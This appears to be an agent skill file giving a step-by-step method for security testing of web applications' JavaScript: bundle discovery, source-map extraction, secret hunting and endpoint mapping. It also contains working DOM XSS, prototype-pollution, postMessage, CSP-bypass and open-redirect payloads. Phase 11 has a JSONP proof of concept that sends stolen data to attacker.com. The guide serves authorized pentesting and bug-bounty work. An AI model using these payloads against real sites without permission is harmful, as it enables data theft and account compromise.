---
name: js-analyzer
description: Full JavaScript analysis methodology for pentesting and bug bounty — JS file discovery, secret extraction, endpoint mapping, DOM XSS, prototype pollution, postMessage abuse, client-side logic flaws, source map extraction, and hardcoded credential hunting
license: MIT
metadata:
  version: "1.0.0"
  author: AuditGuard
  tags: ["javascript", "recon", "xss", "secrets", "prototype-pollution", "dom", "bug-bounty", "pentest"]
---

# JS Analyzer — JavaScript Security Analysis

## When to use

Activate this skill when the user:
- wants to analyze JavaScript files from a target web application
- asks to find endpoints, API routes, or hidden parameters in JS bundles
- wants to hunt for secrets, API keys, or credentials in JS source
- asks to test for DOM XSS, prototype pollution, or postMessage vulnerabilities
- wants to deobfuscate or extract source maps from minified JS
- asks about client-side logic flaws, authorization bypass, or insecure storage
- mentions webpack, React, Angular, Vue, Next.js, or similar JS frameworks
- says things like "analyze the JS", "map the API", "find secrets in the bundle", or "check for client-side vulns"
- pastes a URL to a `.js` file or a JavaScript snippet to review

---

JS files are often the most information-rich attack surface in a web application. A thorough JS review routinely yields: hidden API endpoints, hardcoded secrets, client-side authorization logic to bypass, insecure postMessage handlers, and vulnerable third-party libraries.

Work through every phase in order. Stop and document each finding as you go.

---

## Phase 1 — JS File Discovery

### 1.1 Automated crawling

```bash
# katana — best for SPAs and JS-heavy apps
katana -u https://target.com -jc -d 5 -o js-urls.txt
grep "\.js" js-urls.txt | sort -u

# gau — historical URLs (Wayback + Common Crawl + OTX)
gau target.com | grep "\.js$" | sort -u | tee gau-js.txt

# waybackurls — Wayback Machine only
waybackurls target.com | grep "\.js$" | sort -u

# hakrawler — fast recursive crawl
echo "https://target.com" | hakrawler -js -d 4

# gospider
gospider -s "https://target.com" -c 10 -d 5 --js -o gospider-out/
```

### 1.2 Manual discovery

```bash
# Fetch the root page and extract all script src attributes
curl -s https://target.com | grep -oP '(?<=src=")[^"]+\.js[^"]*'

# Check standard bundler output paths
for path in /app.js /main.js /bundle.js /vendor.js /chunk.js \
            /static/js/main.js /assets/js/app.js /dist/app.js \
            /js/app.js /build/static/js/main.chunk.js; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
  [ "$code" = "200" ] && echo "[+] Found: $path"
done

# Webpack chunk discovery (chunks are numbered)
for i in $(seq 0 20); do
  url="https://target.com/static/js/$i.chunk.js"
  code=$(curl -s -o /dev/null -w "%{http_code}" "$url")
  [ "$code" = "200" ] && echo "[+] Found: $url"
done
```

### 1.3 JS discovery from HTML and other JS files (recursive)

```bash
# Download root page, extract JS, download each JS, extract more JS URLs from them
python3 - << 'EOF'
import re, requests, urllib.parse, sys

TARGET = "https://target.com"
visited = set()
queue = [TARGET]
js_files = set()

def extract_js(text, base):
    for src in re.findall(r'(?:src|import)[=\s(]["\']([^"\']+\.js[^"\']*)["\']', text):
        yield urllib.parse.urljoin(base, src)

while queue:
    url = queue.pop(0)
    if url in visited: continue
    visited.add(url)
    try:
        r = requests.get(url, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
        for js in extract_js(r.text, url):
            if js not in js_files:
                js_files.add(js)
                queue.append(js)
    except: pass

for js in sorted(js_files):
    print(js)
EOF
```

### 1.4 Framework-specific paths

| Framework | Default JS paths |
|---|---|
| Create React App | `/static/js/main.*.chunk.js`, `/static/js/*.chunk.js` |
| Next.js | `/_next/static/chunks/*.js`, `/_next/static/js/*.js` |
| Angular | `/main.*.js`, `/polyfills.*.js`, `/runtime.*.js` |
| Vue CLI | `/js/app.*.js`, `/js/chunk-vendors.*.js` |
| Nuxt.js | `/_nuxt/*.js` |
| Vite | `/assets/*.js` |

---

## Phase 2 — Source Map Extraction

Source maps reveal the original unminified source code of the application.

### 2.1 Detect source maps

```bash
# Check the last line of a JS file for the source map URL comment
curl -s "https://target.com/main.js" | tail -5 | grep sourceMappingURL

# Or fetch directly
curl -s "https://target.com/main.js.map" | python3 -m json.tool | head -20
curl -s "https://target.com/app.js.map" | python3 -m json.tool | head -20
```

### 2.2 Extract source from map

```bash
# sourcemapper — extracts all original source files from .map
go install github.com/denandz/sourcemapper@latest
sourcemapper -url https://target.com/main.js.map -output ./sourcemap-out/

# unwebpack (Python)
pip install unwebpack-sourcemap
unwebpack_sourcemap https://target.com/main.js.map ./sourcemap-out/

# Manual extraction
python3 - << 'EOF'
import json, os, sys

with open("main.js.map") as f:
    sm = json.load(f)

for i, path in enumerate(sm.get("sources", [])):
    src = sm.get("sourcesContent", [])[i] if i < len(sm.get("sourcesContent", [])) else None
    if src:
        out = os.path.join("sourcemap-out", path.lstrip("./"))
        os.makedirs(os.path.dirname(out), exist_ok=True)
        with open(out, "w") as f2:
            f2.write(src)
        print(f"[+] {out}")
EOF
```

### 2.3 After extraction — what to look for

Once you have the original source, proceed through all subsequent phases on the **unminified code**. Pay special attention to:
- `// TODO`, `// FIXME`, `// HACK`, `// DEBUG` comments
- Dev/test endpoints that aren't in production docs
- Feature flag checks (`if (env === 'dev')`, `if (debug)`)
- Admin route conditions (`if (user.role === 'admin')`)

---

## Phase 3 — Secret & Credential Hunting

### 3.1 Automated tools

```bash
# trufflehog — high-accuracy entropy + pattern detection
trufflehog filesystem ./sourcemap-out/ --only-verified
trufflehog git file://./repo/ --only-verified

# gitleaks — SAST for secrets
gitleaks detect --source ./sourcemap-out/ -v

# secretfinder — regex-based, JS-specific
python3 SecretFinder.py -i https://target.com/main.js -o cli

# jsluice — purpose-built JS secrets/URL extractor (Go)
jsluice secrets https://target.com/main.js
jsluice urls https://target.com/main.js

# nuclei secrets template
nuclei -u https://target.com -t exposures/tokens/ -severity medium,high,critical
```

### 3.2 Manual regex patterns

```bash
# Run against all downloaded JS files
JS_DIR="./js-files"

grep_js() {
  grep -rEn "$1" "$JS_DIR" 2>/dev/null | head -30
}

# AWS
grep_js 'AKIA[0-9A-Z]{16}'
grep_js 'aws_secret|AWS_SECRET|AWSSecretKey'

# Generic API keys
grep_js '[aA][pP][iI]_?[kK][eE][yY]\s*[=:]\s*["\x27][A-Za-z0-9_\-]{16,}'
grep_js '[tT]oken\s*[=:]\s*["\x27][A-Za-z0-9_\-\.]{20,}'

# Stripe / Twilio / SendGrid / Slack
grep_js 'sk_live_[0-9a-zA-Z]{24}'       # Stripe secret
grep_js 'pk_live_[0-9a-zA-Z]{24}'       # Stripe public
grep_js 'AC[a-z0-9]{32}'                # Twilio SID
grep_js 'SG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}'  # SendGrid
grep_js 'xox[baprs]-[0-9A-Za-z\-]+'    # Slack token

# Firebase / GCP / Azure
grep_js 'AIza[0-9A-Za-z\-_]{35}'        # Google API key
grep_js '"type"\s*:\s*"service_account"' # GCP service account
grep_js 'firebase[Uu][Rr][Ll]\s*[=:]'

# GitHub / GitLab
grep_js 'ghp_[A-Za-z0-9]{36}'           # GitHub PAT
grep_js 'glpat-[A-Za-z0-9\-_]{20}'      # GitLab PAT

# JWT / private keys
grep_js 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'  # JWT
grep_js 'BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY'

# Database connection strings
grep_js 'mongodb(\+srv)?://[^"'\'']*:[^"'\'']*@'
grep_js 'postgres(ql)?://[^"'\'']*:[^"'\'']*@'
grep_js 'mysql://[^"'\'']*:[^"'\'']*@'

# Passwords / secrets
grep_js 'password\s*[=:]\s*["\x27][^"'\'']{6,}'
grep_js 'secret\s*[=:]\s*["\x27][^"'\'']{8,}'
grep_js 'client_secret\s*[=:]\s*["\x27]'
```

### 3.3 Entropy scan (custom)

```python
import math, re, sys

def entropy(s):
    if not s: return 0
    prob = [float(s.count(c)) / len(s) for c in set(s)]
    return -sum(p * math.log(p, 2) for p in prob)

# Flag strings with high entropy (> 4.5 bits/char) and length > 20
pattern = re.compile(r'["\']([A-Za-z0-9+/=_\-\.]{20,})["\']')

for path in sys.argv[1:]:
    with open(path) as f:
        for lineno, line in enumerate(f, 1):
            for m in pattern.finditer(line):
                s = m.group(1)
                e = entropy(s)
                if e > 4.5:
                    print(f"{path}:{lineno}  [entropy={e:.2f}]  {s[:80]}")
```

---

## Phase 4 — Endpoint & API Route Mapping

### 4.1 Extract URLs and paths

```bash
# jsluice — best dedicated tool
jsluice urls -R https://target.com/main.js | jq .

# LinkFinder — comprehensive regex extraction
python3 linkfinder.py -i https://target.com/main.js -o cli

# getJS — collect all JS then extract links
getJS --url https://target.com --complete --output js-files.txt

# Manual grep
grep -rEo '"(/[a-zA-Z0-9_/?=&\-\.%]+)"' ./js-files/ | grep -v '\.png\|\.svg\|\.css' | sort -u
grep -rEo "fetch\(['\"][^'\"]+['\"]" ./js-files/ | sort -u
grep -rEo "axios\.(get|post|put|delete|patch)\(['\"][^'\"]+['\"]" ./js-files/ | sort -u
grep -rEo '(api|endpoint|baseURL|BASE_URL)\s*[=:]\s*["\x27][^"'\'']+' ./js-files/ | sort -u
```

### 4.2 Parameter extraction

```bash
# Find query parameters referenced in JS
grep -rEo '[?&][a-zA-Z_][a-zA-Z0-9_]*=' ./js-files/ | sort -u

# Find JSON body keys sent to APIs
grep -rEo '"[a-zA-Z_][a-zA-Z0-9_]+":\s*(true|false|null|[0-9]+|"[^"]*")' ./js-files/ | \
  grep -i 'id\|user\|admin\|token\|key\|secret\|pass\|role\|scope' | sort -u

# Hidden parameters — look for feature flags and undocumented params
grep -rEi 'debug|internal|beta|test|admin|staging|dev_mode|feature_flag' ./js-files/ | \
  grep -v '^\s*//' | sort -u
```

### 4.3 GraphQL introspection detection

```bash
# Look for GraphQL operation names and fragments
grep -rE 'query\s+\w+|mutation\s+\w+|subscription\s+\w+|gql`|GraphQL' ./js-files/ | head -30

# Find the GraphQL endpoint
grep -rE '(graphql|gql)["\x27]?\s*[,\)]' ./js-files/ | grep -Eo '"[^"]*"' | sort -u

# Test introspection (once endpoint found)
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'
```

---

## Phase 5 — DOM-Based XSS Analysis

### 5.1 Identify dangerous sinks

```bash
# All high-risk sinks
SINKS="innerHTML|outerHTML|insertAdjacentHTML|document\.write|document\.writeln|\
eval\(|setTimeout\(|setInterval\(|Function\(|new Function|execScript|\
location\.href|location\.assign|location\.replace|location=|window\.location|\
src=|href=|action=|formaction="

grep -rEn "$SINKS" ./js-files/ | grep -v '^\s*//' | sort -u | head -50
```

### 5.2 Identify controllable sources

```bash
SOURCES="location\.search|location\.hash|location\.href|location\.pathname|\
document\.referrer|document\.URL|document\.documentURI|document\.baseURI|\
window\.name|history\.state|postMessage|localStorage\.getItem|sessionStorage\.getItem|\
document\.cookie|URLSearchParams|decodeURI|decodeURIComponent"

grep -rEn "$SOURCES" ./js-files/ | grep -v '^\s*//' | sort -u | head -50
```

### 5.3 Trace source-to-sink flows

For each source found, trace how the value flows to a sink:

```
Source → [optional transformation] → Sink
document.location.search → decodeURIComponent() → innerHTML ← VULNERABLE
document.location.hash → someVar → eval()               ← VULNERABLE
location.href → encodeURIComponent() → innerHTML        ← likely safe (encoded)
```

### 5.4 DOM XSS confirmation payloads

```html
<!-- innerHTML / outerHTML -->
<img src=x onerror=alert(document.domain)>
<svg onload=alert(1)>
<script>alert(1)</script>   <!-- works only without sanitization -->

<!-- eval / Function / setTimeout / setInterval -->
alert(document.domain)
alert`1`
(alert)(1)

<!-- location sinks (open redirect → XSS in some cases) -->
javascript:alert(document.domain)
data:text/html,<script>alert(document.domain)</script>

<!-- src / href injection -->
javascript:alert(1)

<!-- insertAdjacentHTML -->
<img src=x onerror=alert(1)>
```

### 5.5 URL hash / fragment XSS testing

```bash
# If the app reads location.hash and writes it to the DOM:
https://target.com/page#<img src=x onerror=alert(document.domain)>
https://target.com/page#javascript:alert(1)

# Double URL-encoded
https://target.com/page#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

### 5.6 Automated DOM XSS scanning

```bash
# dalfox — powerful DOM XSS scanner
dalfox url "https://target.com/page?param=FUZZ" --skip-bav

# domxssscanner (online)
# https://domxssscanner.com

# Burp DOM Invader — browser extension for tracing sources/sinks
```

---

## Phase 6 — Prototype Pollution

### 6.1 Detect vulnerable patterns

```bash
# Server-side PP (Node.js) — dangerous merge/extend/clone functions
grep -rEn "merge\(|extend\(|clone\(|deepCopy\(|assign\(|defaultsDeep\(" ./js-files/ | \
  grep -v '^\s*//' | head -30

# Look for recursive assignment patterns
grep -rEn "\[key\]\s*=|obj\[prop\]|target\[k\]\s*=" ./js-files/ | head -20

# Look for prototype access
grep -rEn "__proto__|constructor\.prototype|Object\.prototype" ./js-files/ | head -20
```

### 6.2 Client-side PP test payloads

```
# URL query string (if parsed with a vulnerable parser)
?__proto__[polluted]=1
?constructor[prototype][polluted]=1
?__proto__.polluted=1

# JSON body (if merged into an object)
{"__proto__": {"polluted": "1"}}
{"constructor": {"prototype": {"polluted": "1"}}}

# Nested key notation (qs, query-string libraries)
?a[__proto__][polluted]=1
?a[constructor][prototype][polluted]=1
```

### 6.3 Detect pollution

```javascript
// In browser console — after sending the payload:
console.log(({}).polluted);    // → "1" if polluted
console.log(Object.prototype.polluted);  // → "1" if polluted
```

### 6.4 Escalate: PP → XSS

Common gadget chains:
```javascript
// jQuery < 3.4.0 — $.extend deep merge
$.extend(true, {}, JSON.parse(userInput));
// → pollute innerHTML, src, or events → XSS

// sanitize-html / DOMPurify bypass via PP (CVE-2022-25887 style)
{"__proto__": {"allowedTags": ["script"]}}

// Common PP → XSS gadgets
Object.prototype.innerHTML = "<img src=x onerror=alert(1)>"
Object.prototype.src = "https://evil.com/evil.js"
Object.prototype.template = "<img src=x onerror=alert(1)>"
```

### 6.5 Automated PP detection

```bash
# ppmap — browser-based PP gadget scanner
node ppmap/ppmap.js "https://target.com"

# ppfuzz
ppfuzz -u "https://target.com/?param=FUZZ"

# nuclei template
nuclei -u https://target.com -t vulnerabilities/generic/prototype-pollution.yaml
```

---

## Phase 7 — postMessage Vulnerabilities

### 7.1 Find postMessage handlers

```bash
# Look for message event listeners
grep -rEn "addEventListener\(['\"]message['\"]|on[Mm]essage\s*=" ./js-files/ | head -20

# Look for postMessage calls (sending side — reveals what's expected)
grep -rEn "\.postMessage\(" ./js-files/ | head -20

# Look for origin validation (or lack of)
grep -rEn "event\.origin|message\.origin|e\.origin" ./js-files/ | head -20
```

### 7.2 Vulnerable handler patterns

```javascript
// VULNERABLE — no origin check
window.addEventListener("message", function(e) {
    eval(e.data);
});

// VULNERABLE — weak origin check
window.addEventListener("message", function(e) {
    if (e.origin.includes("target.com")) { // bypassable with "evil-target.com"
        document.getElementById("div").innerHTML = e.data;
    }
});

// VULNERABLE — checking wrong property
window.addEventListener("message", function(e) {
    if (e.data.from === "trusted") {  // data is attacker-controlled!
        doSomething(e.data.payload);
    }
});

// SAFE — strict origin check
window.addEventListener("message", function(e) {
    if (e.origin !== "https://trusted.com") return;
    // process e.data
});
```

### 7.3 Exploitation

```html
<!-- Host this on your server / use Burp Collaborator iframe -->
<html>
<body>
<iframe id="target" src="https://target.com/vulnerable-page"></iframe>
<script>
  var iframe = document.getElementById("target");
  iframe.onload = function() {
    // Send payload after the page loads
    iframe.contentWindow.postMessage(
      '<img src=x onerror=alert(document.domain)>',  // innerHTML sink
      '*'  // any origin — or set to target origin
    );
    // Alternative: send an object
    iframe.contentWindow.postMessage(
      {action: "navigate", url: "javascript:alert(1)"},
      '*'
    );
  };
</script>
</body>
</html>
```

### 7.4 Origin bypass techniques

```
# If the check is: e.origin.includes("target.com")
Use origin: https://evil-target.com

# If the check is: e.origin.startsWith("https://target.com")
Use origin: https://target.com.evil.com  (if subdomains allowed)

# If there's no check at all
Use any origin — wildcard * works
```

---

## Phase 8 — Client-Side Logic & Authorization Flaws

### 8.1 Role / admin checks in JS

```bash
# Find client-side role/permission checks
grep -rEin "isAdmin|is_admin|role\s*===|role\s*==|userRole|hasPermission|\
canAccess|isAuthenticated|isPremium|isModerator|isStaff|user\.admin" \
./js-files/ | grep -v '^\s*//' | head -30
```

### 8.2 Feature flags and hidden UI

```bash
# Feature flags / toggle conditions
grep -rEin "featureFlag|feature_flag|launchDarkly|unleash|growthbook|\
enableFeature|if.*debug|if.*beta|if.*staging|if.*internal" \
./js-files/ | head -30

# Hidden routes in SPA routers (React Router, Vue Router, Angular routes)
grep -rEn "path:\s*['\"]|<Route\s|router\.add\|RouterModule\.forRoot" \
./js-files/ | grep -i "admin|dashboard|internal|dev|debug|test|config|manage" | head -20
```

### 8.3 Extract React Router / Vue Router / Angular routes

```bash
# React Router route definitions
grep -rEo '"path":\s*"[^"]+"' ./js-files/ | sort -u
grep -rEo "path:\s*['\"][^'\"]+['\"]" ./js-files/ | sort -u

# Angular route config
grep -rEo "path:\s*['\"][^'\"]*['\"],\s*component" ./js-files/ | sort -u

# Next.js pages/app directory routes (from chunks)
grep -rEo '"/[a-zA-Z0-9/_\-\[\]]*"' ./js-files/ | sort -u | grep -v '\.'
```

### 8.4 Client-side token/auth handling

```bash
# Where are tokens stored?
grep -rEin "localStorage\.setItem\|sessionStorage\.setItem\|document\.cookie\s*=" \
./js-files/ | grep -i "token\|auth\|jwt\|session\|key" | head -20

# JWT/token decode operations
grep -rEin "atob\(|btoa\(|base64|jwtDecode\|parseJwt\|decodeToken" ./js-files/ | head -20

# Auth header construction
grep -rEin "Authorization.*Bearer\|Bearer.*token\|X-Auth-Token\|X-API-Key" \
./js-files/ | head -20
```

---

## Phase 9 — Insecure Storage Analysis

### 9.1 LocalStorage / SessionStorage

```bash
grep -rEin "localStorage\.(get|set|remove|clear)|sessionStorage\.(get|set|remove|clear)" \
./js-files/ | head -30
```

**Risk:** Any data in localStorage is accessible to any JS on the same origin — so XSS leads to immediate theft.

**What to look for:**
- Tokens (JWT, session IDs, API keys) stored in localStorage (vs. HttpOnly cookies)
- PII (email, name, address, credit cards) stored in localStorage
- Cryptographic keys or secrets

### 9.2 Cookies set via JavaScript

```bash
grep -rEin "document\.cookie\s*=" ./js-files/ | head -20
```

**Flags to check:** Are cookies being set without `Secure`, `HttpOnly`, or `SameSite`?

### 9.3 IndexedDB / Cache API

```bash
grep -rEin "indexedDB|idbFactory|openDatabase|cacheStorage|caches\.(open|put|match)" \
./js-files/ | head -20
```

### 9.4 Extract values from live browser storage (devtools console)

```javascript
// All localStorage items
Object.entries(localStorage)

// All sessionStorage items
Object.entries(sessionStorage)

// All cookies
document.cookie

// IndexedDB databases
indexedDB.databases().then(console.log)
```

---

## Phase 10 — Third-Party Library Vulnerability Scanning

### 10.1 Detect libraries and versions

```bash
# retire.js — database of known vulnerable JS libraries
retire --path ./js-files/ --outputformat json | jq .
retire --js --url https://target.com --outputformat text

# npm audit (if package.json is available)
npm audit --json | jq '.vulnerabilities | to_entries[] | {name: .key, severity: .value.severity, via: .value.via}'

# Wappalyzer CLI
wappalyzer https://target.com

# jsluice
jsluice urls https://target.com/main.js | jq '.libraries'
```

### 10.2 Common vulnerable libraries to check

| Library | Versions | Vulnerability | CVE |
|---|---|---|---|
| jQuery | < 3.5.0 | XSS via $.html() | CVE-2020-11022 |
| jQuery | < 3.4.0 | Prototype pollution | CVE-2019-11358 |
| lodash | < 4.17.21 | Prototype pollution | CVE-2021-23337 |
| lodash | < 4.17.19 | Prototype pollution | CVE-2020-8203 |
| Handlebars | < 4.7.7 | Prototype pollution → RCE | CVE-2021-23369 |
| underscore | < 1.13.0 | Prototype pollution | CVE-2021-23358 |
| DOMPurify | < 2.3.4 | mXSS bypass | CVE-2022-25887 |
| angular | < 1.6.0 | Sandbox escape | Multiple |
| minimist | < 1.2.6 | Prototype pollution | CVE-2021-44906 |
| vm2 | < 3.9.11 | Sandbox escape → RCE | CVE-2022-36067 |
| next.js | < 13.4.20 | Cache poisoning | CVE-2023-46298 |
| axios | < 0.21.1 | SSRF | CVE-2020-28168 |

### 10.3 Version fingerprinting

```bash
# From JS file comments and metadata
grep -rE "(version|v)[:\s]+[0-9]+\.[0-9]+\.[0-9]+" ./js-files/ | head -30

# From npm/yarn lock files if accessible
curl -s https://target.com/package-lock.json | jq '.dependencies | to_entries[] | {name: .key, version: .value.version}'
curl -s https://target.com/yarn.lock | grep -A1 "^\"" | grep "version" | head -30
```

---

## Phase 11 — JSONP & Legacy Callback Injection

### 11.1 Find JSONP endpoints

```bash
# Look for callback parameter patterns in JS
grep -rEin "callback=|jsonp=|cb=|\?.*callback\|&callback" ./js-files/ | head -20

# Test JSONP endpoints
curl "https://target.com/api/data?callback=JSONP_TEST"
# Look for: JSONP_TEST({...}) in response

# Check if the callback parameter is reflected unsanitized
curl "https://target.com/api/data?callback=alert(document.domain)//"
```

### 11.2 JSONP XSS exploitation

```html
<!-- If callback parameter is not validated, host this PoC -->
<script src="https://target.com/api/data?callback=alert(document.domain)//"></script>

<!-- Steal data with a controlled callback -->
<script>
function steal(data) {
  new Image().src = "https://attacker.com/log?d=" + encodeURIComponent(JSON.stringify(data));
}
</script>
<script src="https://target.com/api/user/profile?callback=steal"></script>
```

---

## Phase 12 — WebSocket Analysis

### 12.1 Find WebSocket connections

```bash
# WebSocket connection setup in JS
grep -rEin "new WebSocket|ws://|wss://|socket\.connect|io\.connect\|socket\.io" \
./js-files/ | head -20

# Messages sent (what's the protocol?)
grep -rEin "socket\.send\|\.emit\(|ws\.send" ./js-files/ | head -20
```

### 12.2 WebSocket origin bypass

```html
<!-- Test if the WebSocket server validates the Origin header -->
<script>
var ws = new WebSocket("wss://target.com/ws");
ws.onopen = function() {
  ws.send('{"action":"getProfile","userId":1}');
};
ws.onmessage = function(e) {
  console.log(e.data);
};
</script>
```

### 12.3 Intercept WebSocket traffic

Use Burp Suite's WebSocket history tab — intercept and replay messages to test:
- Message tampering (change IDs, roles, amounts)
- Missing authentication on individual message types
- Injection in message parameters (SQLi, XSS, command injection)

---

## Phase 13 — CSP Analysis & Bypass

### 13.1 Extract and parse CSP

```bash
# Fetch headers
curl -s -I "https://target.com" | grep -i "content-security-policy"

# Analyze with csp-evaluator
curl -s -I "https://target.com" | grep -i content-security-policy | \
  python3 -c "import sys; print(sys.stdin.read())"

# Online tool: https://csp-evaluator.withgoogle.com
```

### 13.2 Common CSP bypass techniques

| Bypass | Condition | Payload |
|---|---|---|
| `unsafe-eval` | `script-src` includes `unsafe-eval` | `eval(atob("YWxlcnQoMSk="))` |
| `unsafe-inline` | `script-src` includes `unsafe-inline` | `<script>alert(1)</script>` |
| JSONP endpoint | `script-src` whitelists a domain with JSONP | `<script src="https://whitelisted.com/api?cb=alert(1)">` |
| Angular `ng-src` | `script-src 'self'` + AngularJS allowed | `{{constructor.constructor('alert(1)')()}}` |
| CDN bypass | CDN in whitelist with user-upload | Upload JS to CDN, load from there |
| Dangling markup | No `img-src` restriction | `<img src='https://attacker.com/?data=` |
| `base-uri` missing | No `base-uri` restriction | `<base href="https://attacker.com">` |
| `object-src` missing | No `object-src` | `<object data="javascript:alert(1)">` |

### 13.3 Check for trusted CDN bypasses

```bash
# Domains in script-src that have JSONP or user-controlled content
WHITELIST_DOMAINS=$(curl -sI https://target.com | grep -i content-security-policy | \
  grep -oE 'https?://[^ ;]+' | sort -u)

for domain in $WHITELIST_DOMAINS; do
  echo "[*] Testing $domain for JSONP..."
  curl -s "$domain/api?callback=alert(1)" | grep "alert(1)" && echo "[!] JSONP bypass found at $domain"
done
```

---

## Phase 14 — Deobfuscation & Code Analysis

### 14.1 Deobfuscate JS

```bash
# js-beautify — format minified JS
js-beautify -o pretty.js minified.js
npm install -g js-beautify && js-beautify main.js

# prettier
npx prettier --write main.js

# deobfuscate-js — handles obfuscator.io output
npm install -g deobfuscate-js
deobfuscate-js obfuscated.js

# synchrony — handles common obfuscation patterns
npx synchrony deobfuscate obfuscated.js
```

### 14.2 Handle common obfuscation patterns

```javascript
// Pattern 1: string array with shift/rotate
// Look for: _0x1234 = [...], _0x5678 = function(a,b){...}
// Use: https://deobfuscate.io or synchrony

// Pattern 2: hex/unicode escape sequences
// "\\x61\\x6c\\x65\\x72\\x74" → decode in Node.js:
node -e "console.log('\x61\x6c\x65\x72\x74')"

// Pattern 3: eval(atob("..."))
// Decode base64 first:
echo "YWxlcnQoMSk=" | base64 -d

// Pattern 4: Function constructor
// Function("return this")() — extract the string argument
```

### 14.3 Identify eval sinks in obfuscated code

```bash
grep -rEn "eval\(|Function\(|setTimeout\(['\"]|setInterval\(['\"]" ./js-files/ | head -20
```

---

## Phase 15 — Open Redirect via JS

### 15.1 Find JS-driven redirects

```bash
# Redirect patterns driven by URL parameters or user input
grep -rEin "location\.href\s*=|location\.assign\|location\.replace\|window\.open\(" \
./js-files/ | head -30

# Check if redirects consume URL parameters
grep -rEin "URLSearchParams\|location\.search\|location\.hash" ./js-files/ | \
  grep -i "redirect\|return\|next\|url\|goto\|callback\|target\|dest\|redir" | head -20
```

### 15.2 Test payloads

```
# Basic
https://target.com?redirect=https://evil.com
https://target.com?next=//evil.com
https://target.com?url=javascript:alert(1)

# Bypass techniques
https://target.com?redirect=//evil.com           # protocol-relative
https://target.com?redirect=///evil.com          # triple slash
https://target.com?redirect=/\evil.com           # backslash
https://target.com?redirect=https:evil.com       # missing //
https://target.com?redirect=%09//evil.com        # tab bypass
https://target.com?redirect=https://target.com@evil.com  # @ bypass
```

---

## Phase 16 — Webpack / Bundler Specific Techniques

### 16.1 Webpack bundle analysis

```bash
# Install webpack bundle analyzer
npm install -g webpack-bundle-analyzer

# Check for webpack DevServer exposure (critical: exposes full source)
curl -s "https://target.com/webpack-dev-server" | head -20
curl -s "https://target.com/__webpack_hmr" | head -20

# Look for webpack runtime globals
grep -rEn "__webpack_require__\|webpackJsonp\|__webpack_modules__" ./js-files/ | head -10

# Extract module list from bundle
node -e "
const fs = require('fs');
const bundle = fs.readFileSync('main.js', 'utf8');
const modules = bundle.match(/\/\*\*\*\/ '([^']+)'/g) || [];
modules.forEach(m => console.log(m));
"
```

### 16.2 Extract environment variables from Next.js

```bash
# NEXT_PUBLIC_ variables are bundled into the client
grep -rE "NEXT_PUBLIC_|process\.env\." ./sourcemap-out/ | head -30

# Check the _next/static/chunks/ for env variable leaks
curl -s "https://target.com/_next/static/chunks/pages/_app.js" | \
  grep -oE '"[A-Z_]{5,}":"[^"]+"' | head -20
```

### 16.3 Check for accidentally bundled server-side code

```bash
# Server-side secrets sometimes leak into webpack bundles
grep -rEin "process\.env\.DATABASE_URL|process\.env\.SECRET|process\.env\.PRIVATE" \
./js-files/ | head -20
```

---

## Phase 17 — AngularJS / Angular Specific

### 17.1 AngularJS (1.x) sandbox escapes

```javascript
// Detect: look for ng-* attributes and angular.js in sources

// AngularJS 1.0 - 1.5 sandbox escape
{{constructor.constructor('alert(1)')()}}
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}

// Expression injection in templates
{{7*7}}               // confirm injection
{{$on.constructor('alert(1)')()}}

// After 1.6 (no sandbox):
{{$eval('alert(1)')}}
```

### 17.2 Angular (2+) template injection

Angular 2+ compiles templates at build time, so runtime SSTI is rare, but look for:
```bash
# Dynamic component creation
grep -rEn "DomSanitizer|bypassSecurityTrust|innerHTML|[Oo]uterHTML" ./js-files/ | head -20
# bypassSecurityTrustHtml / bypassSecurityTrustScript — high-risk patterns
```

---

## Phase 18 — Report Structure

```
Title: [Vulnerability Type] in [Component/File] — [Target]

Severity: Critical / High / Medium / Low / Informational
CWE: [number]
OWASP: [category]

Affected asset: [URL or JS file path]
Parameter/sink: [where the issue manifests]

Summary:
[2-3 sentences explaining what was found and why it matters]

Steps to reproduce:
1. [Download/navigate to the JS file]
2. [Show the specific line/pattern]
3. [Send the exploit request or show browser PoC]
4. [Show the result — data exfiltrated, redirect triggered, etc.]

Evidence:
- Code snippet (file:line)
- HTTP request/response or browser console output
- Screenshot of impact

Impact:
[Concrete attacker capability — what they can do, not what the code does]

Remediation:
[Specific fix — code change, library upgrade, header to add]

References:
[CVE, CWE link, OWASP, vendor advisory]
```

---

## Quick-Reference: Priority Triage Order

1. **Source maps exposed** → full source code leak → check everything in unminified code first
2. **Hardcoded secrets** → immediate credential leak → highest priority per bug bounty programs
3. **Dangerous sinks reading URL/hash** → DOM XSS → high severity
4. **postMessage handlers without origin check** → XSS/data theft
5. **Client-side role/admin checks** → authorization bypass → always test backend separately
6. **Vulnerable third-party libraries** → check CVE severity, exploitability in context
7. **JSONP endpoints** → XSS / data theft if callback not validated
8. **Webpack DevServer / source map exposure** → information disclosure

---

## Reference Files

- `references/tools.md` — full tool installation and usage guide
- `references/patterns.md` — complete regex cheatsheet for secret and endpoint hunting
